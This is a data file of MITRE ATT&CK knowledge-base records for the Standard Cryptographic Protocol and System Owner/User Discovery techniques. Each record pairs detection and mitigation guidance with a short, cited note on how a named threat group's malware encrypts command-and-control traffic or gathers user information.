536,"['SSL/TLS inspection is one way of detecting command and control traffic within some encrypted communication channels.[[CiteRef::SANS Decrypting SSL]] SSL/TLS inspection does come with certain risks that should be considered before implementing to avoid potential security issues such as incomplete certificate validation.[[CiteRef::SEI SSL Inspection Risks]]\n\nIf malware uses encryption with symmetric keys, it may be possible to obtain the algorithm and key from samples and use them to decode network traffic to detect malware communications signatures.[[CiteRef::Fidelis DarkComet]]\n\nIn general, analyze network data for uncommon data flows (e.g., a client sending significantly more data than it receives from a server). Processes utilizing the network that do not normally have network communication or have never been seen before are suspicious. Analyze packet contents to detect communications that do not follow the expected protocol behavior for the port that is being used.[[CiteRef::University of Birmingham C2]]']",[],[],[],"['Packet capture', 'Netflow/Enclave netflow', 'Malware reverse engineering', 'Process use of network', 'Process monitoring', 'SSL/TLS inspection']",['[[Group/G0015|Taidoor]] uses RC4 to encrypt the message body of HTTP content.[[CiteRef::TrendMicro Taidoor]]'],['Taidoor'],['Taidoor'],['G0015'],"['Network intrusion detection and prevention systems that use network signatures to identify traffic for specific adversary malware can be used to mitigate activity at the network level. Use of encryption protocols may make typical network-based C2 detection more difficult due to a reduced ability to signature the traffic. Prior knowledge of adversary C2 infrastructure may be useful for domain and IP address blocking, but will likely not be an effective long-term solution because adversaries can change infrastructure often.[[CiteRef::University of Birmingham C2]]']","['Windows Server 2003', 'Windows Server 2008', 'Windows Server 2012', 'Windows XP', 'Windows 7', 'Windows 8', 'Windows Server 2003 R2', 'Windows Server 2008 R2', 'Windows Server 2012 R2', 'Windows Vista', 'Windows 8.1', 'Linux', 'Windows 10', 'MacOS', 'OS X']",[],[],[],['Command and Control'],['Technique/T1032'],['Standard Cryptographic Protocol'],https://attack.mitre.org/wiki/Technique/T1032
537,"['SSL/TLS inspection is one way of detecting command and control traffic within some encrypted communication channels.[[CiteRef::SANS Decrypting SSL]] SSL/TLS inspection does come with certain risks that should be considered before implementing to avoid potential security issues such as incomplete certificate validation.[[CiteRef::SEI SSL Inspection Risks]]\n\nIf malware uses encryption with symmetric keys, it may be possible to obtain the algorithm and key from samples and use them to decode network traffic to detect malware communications signatures.[[CiteRef::Fidelis DarkComet]]\n\nIn general, analyze network data for uncommon data flows (e.g., a client sending significantly more data than it receives from a server). Processes utilizing the network that do not normally have network communication or have never been seen before are suspicious. Analyze packet contents to detect communications that do not follow the expected protocol behavior for the port that is being used.[[CiteRef::University of Birmingham C2]]']",[],[],[],"['Packet capture', 'Netflow/Enclave netflow', 'Malware reverse engineering', 'Process use of network', 'Process monitoring', 'SSL/TLS inspection']","['[[Software/S0034|NETEAGLE]] will decrypt resources it downloads with HTTP requests by using RC4 with the key ""ScoutEagle.""[[CiteRef::FireEye APT30]]']",['APT30'],['APT30'],['G0013'],"['Network intrusion detection and prevention systems that use network signatures to identify traffic for specific adversary malware can be used to mitigate activity at the network level. Use of encryption protocols may make typical network-based C2 detection more difficult due to a reduced ability to signature the traffic. Prior knowledge of adversary C2 infrastructure may be useful for domain and IP address blocking, but will likely not be an effective long-term solution because adversaries can change infrastructure often.[[CiteRef::University of Birmingham C2]]']","['Windows Server 2003', 'Windows Server 2008', 'Windows Server 2012', 'Windows XP', 'Windows 7', 'Windows 8', 'Windows Server 2003 R2', 'Windows Server 2008 R2', 'Windows Server 2012 R2', 'Windows Vista', 'Windows 8.1', 'Linux', 'Windows 10', 'MacOS', 'OS X']",[],[],Software: NETEAGLE,['Command and Control'],['Technique/T1032'],['Standard Cryptographic Protocol'],https://attack.mitre.org/wiki/Technique/T1032
538,"['SSL/TLS inspection is one way of detecting command and control traffic within some encrypted communication channels.[[CiteRef::SANS Decrypting SSL]] SSL/TLS inspection does come with certain risks that should be considered before implementing to avoid potential security issues such as incomplete certificate validation.[[CiteRef::SEI SSL Inspection Risks]]\n\nIf malware uses encryption with symmetric keys, it may be possible to obtain the algorithm and key from samples and use them to decode network traffic to detect malware communications signatures.[[CiteRef::Fidelis DarkComet]]\n\nIn general, analyze network data for uncommon data flows (e.g., a client sending significantly more data than it receives from a server). Processes utilizing the network that do not normally have network communication or have never been seen before are suspicious. Analyze packet contents to detect communications that do not follow the expected protocol behavior for the port that is being used.[[CiteRef::University of Birmingham C2]]']",[],[],[],"['Packet capture', 'Netflow/Enclave netflow', 'Malware reverse engineering', 'Process use of network', 'Process monitoring', 'SSL/TLS inspection']",['[[Software/S0012|PoisonIvy]] uses the Camellia cipher to encrypt communications.[[CiteRef::FireEye Poison Ivy]]'],['admin@338'],['admin@338'],['G0018'],"['Network intrusion detection and prevention systems that use network signatures to identify traffic for specific adversary malware can be used to mitigate activity at the network level. Use of encryption protocols may make typical network-based C2 detection more difficult due to a reduced ability to signature the traffic. Prior knowledge of adversary C2 infrastructure may be useful for domain and IP address blocking, but will likely not be an effective long-term solution because adversaries can change infrastructure often.[[CiteRef::University of Birmingham C2]]']","['Windows Server 2003', 'Windows Server 2008', 'Windows Server 2012', 'Windows XP', 'Windows 7', 'Windows 8', 'Windows Server 2003 R2', 'Windows Server 2008 R2', 'Windows Server 2012 R2', 'Windows Vista', 'Windows 8.1', 'Linux', 'Windows 10', 'MacOS', 'OS X']",[],[],"Software: PoisonIvy, Poison Ivy",['Command and Control'],['Technique/T1032'],['Standard Cryptographic Protocol'],https://attack.mitre.org/wiki/Technique/T1032
539,"['SSL/TLS inspection is one way of detecting command and control traffic within some encrypted communication channels.[[CiteRef::SANS Decrypting SSL]] SSL/TLS inspection does come with certain risks that should be considered before implementing to avoid potential security issues such as incomplete certificate validation.[[CiteRef::SEI SSL Inspection Risks]]\n\nIf malware uses encryption with symmetric keys, it may be possible to obtain the algorithm and key from samples and use them to decode network traffic to detect malware communications signatures.[[CiteRef::Fidelis DarkComet]]\n\nIn general, analyze network data for uncommon data flows (e.g., a client sending significantly more data than it receives from a server). Processes utilizing the network that do not normally have network communication or have never been seen before are suspicious. Analyze packet contents to detect communications that do not follow the expected protocol behavior for the port that is being used.[[CiteRef::University of Birmingham C2]]']",[],[],[],"['Packet capture', 'Netflow/Enclave netflow', 'Malware reverse engineering', 'Process use of network', 'Process monitoring', 'SSL/TLS inspection']",['[[Software/S0118|Nidiran]] uses RC4 to encrypt C2 traffic.[[CiteRef::Symantec Suckfly May 2016]]'],['Suckfly'],['Suckfly'],['G0039'],"['Network intrusion detection and prevention systems that use network signatures to identify traffic for specific adversary malware can be used to mitigate activity at the network level. Use of encryption protocols may make typical network-based C2 detection more difficult due to a reduced ability to signature the traffic. Prior knowledge of adversary C2 infrastructure may be useful for domain and IP address blocking, but will likely not be an effective long-term solution because adversaries can change infrastructure often.[[CiteRef::University of Birmingham C2]]']","['Windows Server 2003', 'Windows Server 2008', 'Windows Server 2012', 'Windows XP', 'Windows 7', 'Windows 8', 'Windows Server 2003 R2', 'Windows Server 2008 R2', 'Windows Server 2012 R2', 'Windows Vista', 'Windows 8.1', 'Linux', 'Windows 10', 'MacOS', 'OS X']",[],[],"Software: Nidiran, Backdoor.Nidiran",['Command and Control'],['Technique/T1032'],['Standard Cryptographic Protocol'],https://attack.mitre.org/wiki/Technique/T1032
540,"['SSL/TLS inspection is one way of detecting command and control traffic within some encrypted communication channels.[[CiteRef::SANS Decrypting SSL]] SSL/TLS inspection does come with certain risks that should be considered before implementing to avoid potential security issues such as incomplete certificate validation.[[CiteRef::SEI SSL Inspection Risks]]\n\nIf malware uses encryption with symmetric keys, it may be possible to obtain the algorithm and key from samples and use them to decode network traffic to detect malware communications signatures.[[CiteRef::Fidelis DarkComet]]\n\nIn general, analyze network data for uncommon data flows (e.g., a client sending significantly more data than it receives from a server). Processes utilizing the network that do not normally have network communication or have never been seen before are suspicious. Analyze packet contents to detect communications that do not follow the expected protocol behavior for the port that is being used.[[CiteRef::University of Birmingham C2]]']",[],[],[],"['Packet capture', 'Netflow/Enclave netflow', 'Malware reverse engineering', 'Process use of network', 'Process monitoring', 'SSL/TLS inspection']",['[[Group/G0038|Stealth Falcon]] malware encrypts C2 traffic using RC4 with a hard-coded key.[[CiteRef::Citizen Lab Stealth Falcon May 2016]]'],['Stealth Falcon'],['Stealth Falcon'],['G0038'],"['Network intrusion detection and prevention systems that use network signatures to identify traffic for specific adversary malware can be used to mitigate activity at the network level. Use of encryption protocols may make typical network-based C2 detection more difficult due to a reduced ability to signature the traffic. Prior knowledge of adversary C2 infrastructure may be useful for domain and IP address blocking, but will likely not be an effective long-term solution because adversaries can change infrastructure often.[[CiteRef::University of Birmingham C2]]']","['Windows Server 2003', 'Windows Server 2008', 'Windows Server 2012', 'Windows XP', 'Windows 7', 'Windows 8', 'Windows Server 2003 R2', 'Windows Server 2008 R2', 'Windows Server 2012 R2', 'Windows Vista', 'Windows 8.1', 'Linux', 'Windows 10', 'MacOS', 'OS X']",[],[],[],['Command and Control'],['Technique/T1032'],['Standard Cryptographic Protocol'],https://attack.mitre.org/wiki/Technique/T1032
541,"['SSL/TLS inspection is one way of detecting command and control traffic within some encrypted communication channels.[[CiteRef::SANS Decrypting SSL]] SSL/TLS inspection does come with certain risks that should be considered before implementing to avoid potential security issues such as incomplete certificate validation.[[CiteRef::SEI SSL Inspection Risks]]\n\nIf malware uses encryption with symmetric keys, it may be possible to obtain the algorithm and key from samples and use them to decode network traffic to detect malware communications signatures.[[CiteRef::Fidelis DarkComet]]\n\nIn general, analyze network data for uncommon data flows (e.g., a client sending significantly more data than it receives from a server). Processes utilizing the network that do not normally have network communication or have never been seen before are suspicious. Analyze packet contents to detect communications that do not follow the expected protocol behavior for the port that is being used.[[CiteRef::University of Birmingham C2]]']",[],[],[],"['Packet capture', 'Netflow/Enclave netflow', 'Malware reverse engineering', 'Process use of network', 'Process monitoring', 'SSL/TLS inspection']",['[[Group/G0037|FIN6]] used the Plink command-line utility to create SSH tunnels to C2 servers.[[CiteRef::FireEye FIN6 April 2016]]'],['FIN6'],['FIN6'],['G0037'],"['Network intrusion detection and prevention systems that use network signatures to identify traffic for specific adversary malware can be used to mitigate activity at the network level. Use of encryption protocols may make typical network-based C2 detection more difficult due to a reduced ability to signature the traffic. Prior knowledge of adversary C2 infrastructure may be useful for domain and IP address blocking, but will likely not be an effective long-term solution because adversaries can change infrastructure often.[[CiteRef::University of Birmingham C2]]']","['Windows Server 2003', 'Windows Server 2008', 'Windows Server 2012', 'Windows XP', 'Windows 7', 'Windows 8', 'Windows Server 2003 R2', 'Windows Server 2008 R2', 'Windows Server 2012 R2', 'Windows Vista', 'Windows 8.1', 'Linux', 'Windows 10', 'MacOS', 'OS X']",[],[],[],['Command and Control'],['Technique/T1032'],['Standard Cryptographic Protocol'],https://attack.mitre.org/wiki/Technique/T1032
542,"['SSL/TLS inspection is one way of detecting command and control traffic within some encrypted communication channels.[[CiteRef::SANS Decrypting SSL]] SSL/TLS inspection does come with certain risks that should be considered before implementing to avoid potential security issues such as incomplete certificate validation.[[CiteRef::SEI SSL Inspection Risks]]\n\nIf malware uses encryption with symmetric keys, it may be possible to obtain the algorithm and key from samples and use them to decode network traffic to detect malware communications signatures.[[CiteRef::Fidelis DarkComet]]\n\nIn general, analyze network data for uncommon data flows (e.g., a client sending significantly more data than it receives from a server). Processes utilizing the network that do not normally have network communication or have never been seen before are suspicious. Analyze packet contents to detect communications that do not follow the expected protocol behavior for the port that is being used.[[CiteRef::University of Birmingham C2]]']",[],[],[],"['Packet capture', 'Netflow/Enclave netflow', 'Malware reverse engineering', 'Process use of network', 'Process monitoring', 'SSL/TLS inspection']",['[[Software/S0053|SeaDuke]] C2 traffic has been encrypted with RC4 and AES.[[CiteRef::Unit 42 SeaDuke 2015]][[CiteRef::Mandiant No Easy Breach]]'],['APT29'],"['APT29', 'The Dukes', 'Cozy Bear']",['G0016'],"['Network intrusion detection and prevention systems that use network signatures to identify traffic for specific adversary malware can be used to mitigate activity at the network level. Use of encryption protocols may make typical network-based C2 detection more difficult due to a reduced ability to signature the traffic. Prior knowledge of adversary C2 infrastructure may be useful for domain and IP address blocking, but will likely not be an effective long-term solution because adversaries can change infrastructure often.[[CiteRef::University of Birmingham C2]]']","['Windows Server 2003', 'Windows Server 2008', 'Windows Server 2012', 'Windows XP', 'Windows 7', 'Windows 8', 'Windows Server 2003 R2', 'Windows Server 2008 R2', 'Windows Server 2012 R2', 'Windows Vista', 'Windows 8.1', 'Linux', 'Windows 10', 'MacOS', 'OS X']",[],[],"Software: SeaDuke, SeaDaddy, SeaDesk",['Command and Control'],['Technique/T1032'],['Standard Cryptographic Protocol'],https://attack.mitre.org/wiki/Technique/T1032
543,"['SSL/TLS inspection is one way of detecting command and control traffic within some encrypted communication channels.[[CiteRef::SANS Decrypting SSL]] SSL/TLS inspection does come with certain risks that should be considered before implementing to avoid potential security issues such as incomplete certificate validation.[[CiteRef::SEI SSL Inspection Risks]]\n\nIf malware uses encryption with symmetric keys, it may be possible to obtain the algorithm and key from samples and use them to decode network traffic to detect malware communications signatures.[[CiteRef::Fidelis DarkComet]]\n\nIn general, analyze network data for uncommon data flows (e.g., a client sending significantly more data than it receives from a server). Processes utilizing the network that do not normally have network communication or have never been seen before are suspicious. Analyze packet contents to detect communications that do not follow the expected protocol behavior for the port that is being used.[[CiteRef::University of Birmingham C2]]']",[],[],[],"['Packet capture', 'Netflow/Enclave netflow', 'Malware reverse engineering', 'Process use of network', 'Process monitoring', 'SSL/TLS inspection']",['[[Software/S0150|POSHSPY]] encrypts C2 traffic with AES and RSA.[[CiteRef::FireEye POSHSPY April 2017]]'],['APT29'],"['APT29', 'The Dukes', 'Cozy Bear']",['G0016'],"['Network intrusion detection and prevention systems that use network signatures to identify traffic for specific adversary malware can be used to mitigate activity at the network level. Use of encryption protocols may make typical network-based C2 detection more difficult due to a reduced ability to signature the traffic. Prior knowledge of adversary C2 infrastructure may be useful for domain and IP address blocking, but will likely not be an effective long-term solution because adversaries can change infrastructure often.[[CiteRef::University of Birmingham C2]]']","['Windows Server 2003', 'Windows Server 2008', 'Windows Server 2012', 'Windows XP', 'Windows 7', 'Windows 8', 'Windows Server 2003 R2', 'Windows Server 2008 R2', 'Windows Server 2012 R2', 'Windows Vista', 'Windows 8.1', 'Linux', 'Windows 10', 'MacOS', 'OS X']",[],[],Software: POSHSPY,['Command and Control'],['Technique/T1032'],['Standard Cryptographic Protocol'],https://attack.mitre.org/wiki/Technique/T1032
544,"['SSL/TLS inspection is one way of detecting command and control traffic within some encrypted communication channels.[[CiteRef::SANS Decrypting SSL]] SSL/TLS inspection does come with certain risks that should be considered before implementing to avoid potential security issues such as incomplete certificate validation.[[CiteRef::SEI SSL Inspection Risks]]\n\nIf malware uses encryption with symmetric keys, it may be possible to obtain the algorithm and key from samples and use them to decode network traffic to detect malware communications signatures.[[CiteRef::Fidelis DarkComet]]\n\nIn general, analyze network data for uncommon data flows (e.g., a client sending significantly more data than it receives from a server). Processes utilizing the network that do not normally have network communication or have never been seen before are suspicious. Analyze packet contents to detect communications that do not follow the expected protocol behavior for the port that is being used.[[CiteRef::University of Birmingham C2]]']",[],[],[],"['Packet capture', 'Netflow/Enclave netflow', 'Malware reverse engineering', 'Process use of network', 'Process monitoring', 'SSL/TLS inspection']",['[[Group/G0032|Lazarus Group]] malware uses Caracachs encryption to encrypt C2 payloads.[[CiteRef::Novetta Blockbuster]]'],['Lazarus Group'],"['Lazarus Group', 'HIDDEN COBRA', 'Guardians of Peace']",['G0032'],"['Network intrusion detection and prevention systems that use network signatures to identify traffic for specific adversary malware can be used to mitigate activity at the network level. Use of encryption protocols may make typical network-based C2 detection more difficult due to a reduced ability to signature the traffic. Prior knowledge of adversary C2 infrastructure may be useful for domain and IP address blocking, but will likely not be an effective long-term solution because adversaries can change infrastructure often.[[CiteRef::University of Birmingham C2]]']","['Windows Server 2003', 'Windows Server 2008', 'Windows Server 2012', 'Windows XP', 'Windows 7', 'Windows 8', 'Windows Server 2003 R2', 'Windows Server 2008 R2', 'Windows Server 2012 R2', 'Windows Vista', 'Windows 8.1', 'Linux', 'Windows 10', 'MacOS', 'OS X']",[],[],[],['Command and Control'],['Technique/T1032'],['Standard Cryptographic Protocol'],https://attack.mitre.org/wiki/Technique/T1032
545,"['SSL/TLS inspection is one way of detecting command and control traffic within some encrypted communication channels.[[CiteRef::SANS Decrypting SSL]] SSL/TLS inspection does come with certain risks that should be considered before implementing to avoid potential security issues such as incomplete certificate validation.[[CiteRef::SEI SSL Inspection Risks]]\n\nIf malware uses encryption with symmetric keys, it may be possible to obtain the algorithm and key from samples and use them to decode network traffic to detect malware communications signatures.[[CiteRef::Fidelis DarkComet]]\n\nIn general, analyze network data for uncommon data flows (e.g., a client sending significantly more data than it receives from a server). Processes utilizing the network that do not normally have network communication or have never been seen before are suspicious. Analyze packet contents to detect communications that do not follow the expected protocol behavior for the port that is being used.[[CiteRef::University of Birmingham C2]]']",[],[],[],"['Packet capture', 'Netflow/Enclave netflow', 'Malware reverse engineering', 'Process use of network', 'Process monitoring', 'SSL/TLS inspection']",['[[Software/S0012|PoisonIvy]] uses the Camellia cipher to encrypt communications.[[CiteRef::FireEye Poison Ivy]]'],['menuPass'],"['menuPass', 'Stone Panda', 'APT10', 'Red Apollo', 'CVNX']",['G0045'],"['Network intrusion detection and prevention systems that use network signatures to identify traffic for specific adversary malware can be used to mitigate activity at the network level. Use of encryption protocols may make typical network-based C2 detection more difficult due to a reduced ability to signature the traffic. Prior knowledge of adversary C2 infrastructure may be useful for domain and IP address blocking, but will likely not be an effective long-term solution because adversaries can change infrastructure often.[[CiteRef::University of Birmingham C2]]']","['Windows Server 2003', 'Windows Server 2008', 'Windows Server 2012', 'Windows XP', 'Windows 7', 'Windows 8', 'Windows Server 2003 R2', 'Windows Server 2008 R2', 'Windows Server 2012 R2', 'Windows Vista', 'Windows 8.1', 'Linux', 'Windows 10', 'MacOS', 'OS X']",[],[],"Software: PoisonIvy, Poison Ivy",['Command and Control'],['Technique/T1032'],['Standard Cryptographic Protocol'],https://attack.mitre.org/wiki/Technique/T1032
546,"['SSL/TLS inspection is one way of detecting command and control traffic within some encrypted communication channels.[[CiteRef::SANS Decrypting SSL]] SSL/TLS inspection does come with certain risks that should be considered before implementing to avoid potential security issues such as incomplete certificate validation.[[CiteRef::SEI SSL Inspection Risks]]\n\nIf malware uses encryption with symmetric keys, it may be possible to obtain the algorithm and key from samples and use them to decode network traffic to detect malware communications signatures.[[CiteRef::Fidelis DarkComet]]\n\nIn general, analyze network data for uncommon data flows (e.g., a client sending significantly more data than it receives from a server). Processes utilizing the network that do not normally have network communication or have never been seen before are suspicious. Analyze packet contents to detect communications that do not follow the expected protocol behavior for the port that is being used.[[CiteRef::University of Birmingham C2]]']",[],[],[],"['Packet capture', 'Netflow/Enclave netflow', 'Malware reverse engineering', 'Process use of network', 'Process monitoring', 'SSL/TLS inspection']",['[[Software/S0144|ChChes]] can encrypt C2 traffic with AES.[[CiteRef::Palo Alto menuPass Feb 2017]][[CiteRef::JPCERT ChChes Feb 2017]]'],['menuPass'],"['menuPass', 'Stone Panda', 'APT10', 'Red Apollo', 'CVNX']",['G0045'],"['Network intrusion detection and prevention systems that use network signatures to identify traffic for specific adversary malware can be used to mitigate activity at the network level. Use of encryption protocols may make typical network-based C2 detection more difficult due to a reduced ability to signature the traffic. Prior knowledge of adversary C2 infrastructure may be useful for domain and IP address blocking, but will likely not be an effective long-term solution because adversaries can change infrastructure often.[[CiteRef::University of Birmingham C2]]']","['Windows Server 2003', 'Windows Server 2008', 'Windows Server 2012', 'Windows XP', 'Windows 7', 'Windows 8', 'Windows Server 2003 R2', 'Windows Server 2008 R2', 'Windows Server 2012 R2', 'Windows Vista', 'Windows 8.1', 'Linux', 'Windows 10', 'MacOS', 'OS X']",[],[],"Software: ChChes, Scorpion, HAYMAKER",['Command and Control'],['Technique/T1032'],['Standard Cryptographic Protocol'],https://attack.mitre.org/wiki/Technique/T1032
547,"['SSL/TLS inspection is one way of detecting command and control traffic within some encrypted communication channels.[[CiteRef::SANS Decrypting SSL]] SSL/TLS inspection does come with certain risks that should be considered before implementing to avoid potential security issues such as incomplete certificate validation.[[CiteRef::SEI SSL Inspection Risks]]\n\nIf malware uses encryption with symmetric keys, it may be possible to obtain the algorithm and key from samples and use them to decode network traffic to detect malware communications signatures.[[CiteRef::Fidelis DarkComet]]\n\nIn general, analyze network data for uncommon data flows (e.g., a client sending significantly more data than it receives from a server). Processes utilizing the network that do not normally have network communication or have never been seen before are suspicious. Analyze packet contents to detect communications that do not follow the expected protocol behavior for the port that is being used.[[CiteRef::University of Birmingham C2]]']",[],[],[],"['Packet capture', 'Netflow/Enclave netflow', 'Malware reverse engineering', 'Process use of network', 'Process monitoring', 'SSL/TLS inspection']",['[[Software/S0153|RedLeaves]] encrypts C2 traffic with RC4 using a secret key of 88888888.[[CiteRef::PWC Cloud Hopper Technical Annex April 2017]]'],['menuPass'],"['menuPass', 'Stone Panda', 'APT10', 'Red Apollo', 'CVNX']",['G0045'],"['Network intrusion detection and prevention systems that use network signatures to identify traffic for specific adversary malware can be used to mitigate activity at the network level. Use of encryption protocols may make typical network-based C2 detection more difficult due to a reduced ability to signature the traffic. Prior knowledge of adversary C2 infrastructure may be useful for domain and IP address blocking, but will likely not be an effective long-term solution because adversaries can change infrastructure often.[[CiteRef::University of Birmingham C2]]']","['Windows Server 2003', 'Windows Server 2008', 'Windows Server 2012', 'Windows XP', 'Windows 7', 'Windows 8', 'Windows Server 2003 R2', 'Windows Server 2008 R2', 'Windows Server 2012 R2', 'Windows Vista', 'Windows 8.1', 'Linux', 'Windows 10', 'MacOS', 'OS X']",[],[],"Software: RedLeaves, BUGJUICE",['Command and Control'],['Technique/T1032'],['Standard Cryptographic Protocol'],https://attack.mitre.org/wiki/Technique/T1032
548,"['SSL/TLS inspection is one way of detecting command and control traffic within some encrypted communication channels.[[CiteRef::SANS Decrypting SSL]] SSL/TLS inspection does come with certain risks that should be considered before implementing to avoid potential security issues such as incomplete certificate validation.[[CiteRef::SEI SSL Inspection Risks]]\n\nIf malware uses encryption with symmetric keys, it may be possible to obtain the algorithm and key from samples and use them to decode network traffic to detect malware communications signatures.[[CiteRef::Fidelis DarkComet]]\n\nIn general, analyze network data for uncommon data flows (e.g., a client sending significantly more data than it receives from a server). Processes utilizing the network that do not normally have network communication or have never been seen before are suspicious. Analyze packet contents to detect communications that do not follow the expected protocol behavior for the port that is being used.[[CiteRef::University of Birmingham C2]]']",[],[],[],"['Packet capture', 'Netflow/Enclave netflow', 'Malware reverse engineering', 'Process use of network', 'Process monitoring', 'SSL/TLS inspection']",['[[Software/S0159|SNUGRIDE]] encrypts C2 traffic using AES with a static key.[[CiteRef::FireEye APT10 April 2017]]'],['menuPass'],"['menuPass', 'Stone Panda', 'APT10', 'Red Apollo', 'CVNX']",['G0045'],"['Network intrusion detection and prevention systems that use network signatures to identify traffic for specific adversary malware can be used to mitigate activity at the network level. Use of encryption protocols may make typical network-based C2 detection more difficult due to a reduced ability to signature the traffic. Prior knowledge of adversary C2 infrastructure may be useful for domain and IP address blocking, but will likely not be an effective long-term solution because adversaries can change infrastructure often.[[CiteRef::University of Birmingham C2]]']","['Windows Server 2003', 'Windows Server 2008', 'Windows Server 2012', 'Windows XP', 'Windows 7', 'Windows 8', 'Windows Server 2003 R2', 'Windows Server 2008 R2', 'Windows Server 2012 R2', 'Windows Vista', 'Windows 8.1', 'Linux', 'Windows 10', 'MacOS', 'OS X']",[],[],Software: SNUGRIDE,['Command and Control'],['Technique/T1032'],['Standard Cryptographic Protocol'],https://attack.mitre.org/wiki/Technique/T1032
549,"['SSL/TLS inspection is one way of detecting command and control traffic within some encrypted communication channels.[[CiteRef::SANS Decrypting SSL]] SSL/TLS inspection does come with certain risks that should be considered before implementing to avoid potential security issues such as incomplete certificate validation.[[CiteRef::SEI SSL Inspection Risks]]\n\nIf malware uses encryption with symmetric keys, it may be possible to obtain the algorithm and key from samples and use them to decode network traffic to detect malware communications signatures.[[CiteRef::Fidelis DarkComet]]\n\nIn general, analyze network data for uncommon data flows (e.g., a client sending significantly more data than it receives from a server). Processes utilizing the network that do not normally have network communication or have never been seen before are suspicious. Analyze packet contents to detect communications that do not follow the expected protocol behavior for the port that is being used.[[CiteRef::University of Birmingham C2]]']",[],[],[],"['Packet capture', 'Netflow/Enclave netflow', 'Malware reverse engineering', 'Process use of network', 'Process monitoring', 'SSL/TLS inspection']",['[[Software/S0012|PoisonIvy]] uses the Camellia cipher to encrypt communications.[[CiteRef::FireEye Poison Ivy]]'],['Molerats'],"['Molerats', 'Gaza cybergang', 'Operation Molerats']",['G0021'],"['Network intrusion detection and prevention systems that use network signatures to identify traffic for specific adversary malware can be used to mitigate activity at the network level. Use of encryption protocols may make typical network-based C2 detection more difficult due to a reduced ability to signature the traffic. Prior knowledge of adversary C2 infrastructure may be useful for domain and IP address blocking, but will likely not be an effective long-term solution because adversaries can change infrastructure often.[[CiteRef::University of Birmingham C2]]']","['Windows Server 2003', 'Windows Server 2008', 'Windows Server 2012', 'Windows XP', 'Windows 7', 'Windows 8', 'Windows Server 2003 R2', 'Windows Server 2008 R2', 'Windows Server 2012 R2', 'Windows Vista', 'Windows 8.1', 'Linux', 'Windows 10', 'MacOS', 'OS X']",[],[],"Software: PoisonIvy, Poison Ivy",['Command and Control'],['Technique/T1032'],['Standard Cryptographic Protocol'],https://attack.mitre.org/wiki/Technique/T1032
550,"['System and network discovery techniques normally occur throughout an operation as an adversary learns the environment. Data and events should not be viewed in isolation, but as part of a chain of behavior that could lead to other activities based on the information obtained.\n\nMonitor processes and command-line arguments for actions that could be taken to gather system and network information. Remote access tools with built-in features may interact directly with the Windows API to gather information. Information may also be acquired through Windows system management tools such as [[Technique/T1047|Windows Management Instrumentation]] and [[Technique/T1086|PowerShell]].']",[],['577'],[],"['File monitoring', 'Process monitoring', 'Process command-line parameters']","['A Linux version of [[Software/S0021|Derusbi]] checks if the victim user ID is anything other than zero (normally used for root), and the malware will not execute if it does not have root privileges.[[CiteRef::Fidelis Turbo]]']",['Deep Panda'],"['Deep Panda', 'Shell Crew', 'WebMasters', 'KungFu Kittens', 'PinkPanther', 'Black Vine']",['G0009'],"['Identify unnecessary system utilities or potentially malicious software that may be used to acquire information about system users, and audit and/or block them by using whitelisting[[CiteRef::Beechey 2010]] tools, like AppLocker,[[CiteRef::Windows Commands JPCERT]][[CiteRef::NSA MS AppLocker]] or Software Restriction Policies[[CiteRef::Corio 2008]] where appropriate.[[CiteRef::TechNet Applocker vs SRP]]']","['Windows Server 2003', 'Windows Server 2008', 'Windows Server 2012', 'Windows XP', 'Windows 7', 'Windows 8', 'Windows Server 2003 R2', 'Windows Server 2008 R2', 'Windows Server 2012 R2', 'Windows Vista', 'Windows 8.1', 'Linux', 'Windows 10', 'MacOS', 'OS X']","['User', 'Administrator']",[],Software: Derusbi,['Discovery'],['Technique/T1033'],['System Owner/User Discovery'],https://attack.mitre.org/wiki/Technique/T1033
551,"['System and network discovery techniques normally occur throughout an operation as an adversary learns the environment. Data and events should not be viewed in isolation, but as part of a chain of behavior that could lead to other activities based on the information obtained.\n\nMonitor processes and command-line arguments for actions that could be taken to gather system and network information. Remote access tools with built-in features may interact directly with the Windows API to gather information. Information may also be acquired through Windows system management tools such as [[Technique/T1047|Windows Management Instrumentation]] and [[Technique/T1086|PowerShell]].']",[],['577'],[],"['File monitoring', 'Process monitoring', 'Process command-line parameters']","[""A [[Group/G0047|Gamaredon Group]] file stealer can gather the victim's username to send to a C2 server.[[CiteRef::Palo Alto Gamaredon Feb 2017]]""]",['Gamaredon Group'],['Gamaredon Group'],['G0047'],"['Identify unnecessary system utilities or potentially malicious software that may be used to acquire information about system users, and audit and/or block them by using whitelisting[[CiteRef::Beechey 2010]] tools, like AppLocker,[[CiteRef::Windows Commands JPCERT]][[CiteRef::NSA MS AppLocker]] or Software Restriction Policies[[CiteRef::Corio 2008]] where appropriate.[[CiteRef::TechNet Applocker vs SRP]]']","['Windows Server 2003', 'Windows Server 2008', 'Windows Server 2012', 'Windows XP', 'Windows 7', 'Windows 8', 'Windows Server 2003 R2', 'Windows Server 2008 R2', 'Windows Server 2012 R2', 'Windows Vista', 'Windows 8.1', 'Linux', 'Windows 10', 'MacOS', 'OS X']","['User', 'Administrator']",[],[],['Discovery'],['Technique/T1033'],['System Owner/User Discovery'],https://attack.mitre.org/wiki/Technique/T1033
552,"['System and network discovery techniques normally occur throughout an operation as an adversary learns the environment. Data and events should not be viewed in isolation, but as part of a chain of behavior that could lead to other activities based on the information obtained.\n\nMonitor processes and command-line arguments for actions that could be taken to gather system and network information. Remote access tools with built-in features may interact directly with the Windows API to gather information. Information may also be acquired through Windows system management tools such as [[Technique/T1047|Windows Management Instrumentation]] and [[Technique/T1086|PowerShell]].']",[],['577'],[],"['File monitoring', 'Process monitoring', 'Process command-line parameters']",['[[Software/S0125|Remsec]] can obtain information about the current user.[[CiteRef::Kaspersky ProjectSauron Technical Analysis]]'],['Strider'],"['Strider', 'ProjectSauron']",['G0041'],"['Identify unnecessary system utilities or potentially malicious software that may be used to acquire information about system users, and audit and/or block them by using whitelisting[[CiteRef::Beechey 2010]] tools, like AppLocker,[[CiteRef::Windows Commands JPCERT]][[CiteRef::NSA MS AppLocker]] or Software Restriction Policies[[CiteRef::Corio 2008]] where appropriate.[[CiteRef::TechNet Applocker vs SRP]]']","['Windows Server 2003', 'Windows Server 2008', 'Windows Server 2012', 'Windows XP', 'Windows 7', 'Windows 8', 'Windows Server 2003 R2', 'Windows Server 2008 R2', 'Windows Server 2012 R2', 'Windows Vista', 'Windows 8.1', 'Linux', 'Windows 10', 'MacOS', 'OS X']","['User', 'Administrator']",[],"Software: Remsec, Backdoor.Remsec, ProjectSauron",['Discovery'],['Technique/T1033'],['System Owner/User Discovery'],https://attack.mitre.org/wiki/Technique/T1033
